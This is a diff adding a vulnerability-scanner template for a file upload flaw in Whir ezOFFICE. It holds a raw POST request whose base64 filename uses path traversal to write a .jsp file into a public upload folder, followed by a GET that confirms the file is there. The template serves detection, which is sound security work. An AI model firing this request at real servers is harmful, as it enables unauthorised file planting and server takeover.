@@ -1,0 +1,46 @@
+id: whir-ezoffice-attachmentserver-file-upload
+info:
+  name: Whir ezOFFICE attachmentServer.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Whir ezOFFICE attachmentServer.jsp has a file upload vulnerability allowing attackers to upload dangerous files, potentially leading to backdoor installation and server control.
+  tags: fileupload
+http:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/attachmentServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        DBSTEP V3.0        0000000016      0               0000000016      DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU
+        isEncrypt=MA==
+        moduleType=aW5mb3JtYXRpb24=
+        FILENAME={{base64("//../../public/upload/plupload/" + rand_text_alphanumeric(6) + ".jsp")}}
+        {{rand_text_alphanumeric(6)}}
+    extractors:
+      - type: regex
+        name: upload-path
+        part: body
+        internal: true
+        regex:
+          - "/defaultroot/public/upload/plupload/([a-zA-Z0-9]+\\.jsp)"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "5L+d5a2Y5oiQ5YqfIQ=="
+        condition: and
+  - raw:
+      - |
+        GET /defaultroot/public/upload/plupload/{{upload-path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{rand_text_alphanumeric(6)}}"
+    matchers-condition: and
+flow: |
+  http(1) && http(2)
